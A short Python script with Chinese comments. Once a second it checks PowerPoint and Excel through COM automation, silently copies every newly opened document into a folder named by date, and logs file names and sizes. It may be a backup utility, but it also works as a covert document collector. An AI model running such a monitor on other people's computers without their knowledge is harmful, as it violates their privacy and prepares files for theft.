# 导入所需的模块
import os
import time
import shutil
import datetime
import win32com.client

# 根据当前日期创建文件夹，格式是yyyy.mm.dd
today = datetime.date.today()
folder_name = today.strftime("%Y.%m.%d")
if not os.path.exists(folder_name): # 检查文件夹是否已经存在
    os.mkdir(folder_name) # 如果不存在则创建

# 在目录下创建info.txt的文件
info_file = open(os.path.join(folder_name, "info.txt"), "a") # 以追加模式打开，如果不存在则创建

# 在目录下创建log.txt的文件
log_file = open(os.path.join(folder_name, "log.txt"), "a") # 以追加模式打开，如果不存在则创建

# 监控powerpoint和excel打开文件的行为
ppt = win32com.client.Dispatch("PowerPoint.Application")
excel = win32com.client.Dispatch("Excel.Application")
ppt_files = set() # 用于存储已经打开过的ppt文件
excel_files = set() # 用于存储已经打开过的excel文件

while True: # 无限循环，直到用户退出程序
    # 遍历当前打开的ppt文件
    for presentation in ppt.Presentations:
        file_name = presentation.FullName # 获取文件的完整路径和名称
        if file_name not in ppt_files: # 如果是新打开的文件
            ppt_files.add(file_name) # 将文件添加到集合中
            file_size = os.path.getsize(file_name) # 获取文件的大小，单位是字节
            try: # 尝试复制文件到创建的文件夹中
                shutil.copy(file_name, folder_name)
                info_file.write(f"{file_name} {file_size}\n") # 将文件名字+大小信息写入info.txt
                log_file.write(f"{datetime.datetime.now()} Copied {file_name} successfully\n") # 将复制成功的时间和结果写入log.txt
            except Exception as e: # 如果复制失败，捕获异常并记录原因
                log_file.write(f"{datetime.datetime.now()} Failed to copy {file_name} due to {e}\n") # 将复制失败的时间和原因写入log.txt

    # 遍历当前打开的excel文件
    for workbook in excel.Workbooks:
        file_name = workbook.FullName # 获取文件的完整路径和名称
        if file_name not in excel_files: # 如果是新打开的文件
            excel_files.add(file_name) # 将文件添加到集合中
            file_size = os.path.getsize(file_name) # 获取文件的大小，单位是字节
            try: # 尝试复制文件到创建的文件夹中
                shutil.copy(file_name, folder_name)
                info_file.write(f"{file_name} {file_size}\n") # 将文件名字+大小信息写入info.txt
                log_file.write(f"{datetime.datetime.now()} Copied {file_name} successfully\n") # 将复制成功的时间和结果写入log.txt
            except Exception as e: # 如果复制失败，捕获异常并记录原因
                log_file.write(f"{datetime.datetime.now()} Failed to copy {file_name} due to {e}\n") # 将复制失败的时间和原因写入log.txt

    # 每隔一秒检查一次是否有新打开的文件
    time.sleep(1)